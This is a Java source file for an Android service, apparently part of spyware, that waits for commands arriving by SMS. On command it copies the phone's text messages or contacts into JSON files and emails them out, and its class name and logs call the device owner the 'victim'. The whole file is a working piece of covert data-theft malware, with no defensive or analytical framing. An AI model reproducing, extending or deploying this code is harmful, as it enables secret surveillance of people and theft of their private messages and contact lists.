package com.tvh.security.services;

import com.tvh.security.models.CommandType;
import com.tvh.security.models.Parameters;
import com.tvh.security.receivers.SmsReceiver;
import com.tvh.security.utils.PreferencesUtils;
import com.tvh.security.utils.Utils;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

public class GetVictimInformationServiceForUnroot extends Service implements Parameters {

    private static final String TAG = GetVictimInformationServiceForUnroot.class.getSimpleName();
    private static final Object FILE_EXTENSION = ".json";
    private String m_type = null;
    private String m_filename = null;

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @SuppressWarnings("deprecation")
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        //retrieve information from extra
        m_type = intent.getStringExtra(SmsReceiver.TYPE_INFO);
        CommandType commandType = CommandType.findType(m_type);
        boolean isExecuteSeccuess = false;
        switch (commandType) {
            case COMMAND_GET_MESSAGE_DB:
                Log.d("Get Victim Information unrooted device", "Messaging");
                SmsDAO sms = new SmsDAO(getApplicationContext());
                m_filename = PreferencesUtils.getPathSaveFile(getApplicationContext()) + "messages" + Utils.getDateNow() + FILE_EXTENSION;
                isExecuteSeccuess = new BackupSMS(sms).backup(m_filename);
                break;
            case COMMAND_GET_CONTACT_DB:
                Log.d("Get Victim information unrooted device", "Contact");
                ContactDAO contact = new ContactDAO(getApplicationContext());
                m_filename = PreferencesUtils.getPathSaveFile(getApplicationContext()) + "contacts" + Utils.getDateNow() + FILE_EXTENSION;
                isExecuteSeccuess = new BackupContact(contact).backup(m_filename);
                break;

            default:
                break;
        }
        if (isExecuteSeccuess && m_filename != null) {
            // Send email
            Utils.sendEmail(getBaseContext(), m_filename, true);
        }
        stopSelf();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

}
